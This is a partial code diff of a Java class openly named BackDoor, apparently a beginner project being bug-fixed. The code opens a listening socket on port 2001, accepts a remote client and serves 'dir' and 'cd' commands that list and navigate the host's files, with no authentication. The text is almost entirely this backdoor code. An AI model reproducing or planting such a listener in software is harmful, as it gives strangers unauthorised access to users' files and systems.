@@ -15,7 +15,7 @@ public class BackDoor {
 	public static void main(String[] args) throws IOException {
 		// TODO Auto-generated method stub
 
-		//try {
+		
 			ServerSocket server=new ServerSocket(2001);
 			Socket client=server.accept();
 			String workingDir=System.getProperty("user.dir");
@@ -36,20 +36,20 @@ public class BackDoor {
 				writer.flush();
 				String clientCommand=reader.readLine();
 				
-				if(clientCommand.equalsIgnoreCase("cd .")) {
-					writer.write("\nWorking directory is: "+workingDir+"\n\n");
-				}
+				//if(clientCommand.equalsIgnoreCase("cd .")) {
+				//	writer.write("\nWorking directory is: "+workingDir+"\n\n");
+				//}
 				
-				else if(clientCommand.equalsIgnoreCase("dir")){
-					writer.write("\nShould list files in the current directory \n\n");
+				 if(clientCommand.equalsIgnoreCase("dir")){
+					writer.write("\nHere is a list of files in your current directory \n\n");
 					File currentDirectory=new File(workingDir);
 					File[] allFiles=currentDirectory.listFiles();
 					
 					for(File f:allFiles) {
-						writer.write("\n\r"+f.getName()+(f.isDirectory()?"- Directory":"- file"));
+					writer.write("\n\r"+f.getName()+(f.isDirectory()?"- Directory":"- file"));
 					}
-				}
-					else if(clientCommand.startsWith("cd"));{
+					
+				}else if(clientCommand.startsWith("cd")){
 						String d =clientCommand.split(" ")[1];
 						File work;
 						
@@ -69,7 +69,7 @@ public class BackDoor {
 					}
 				}
 		
-		}
 		
-			
+		
+	}		
 }
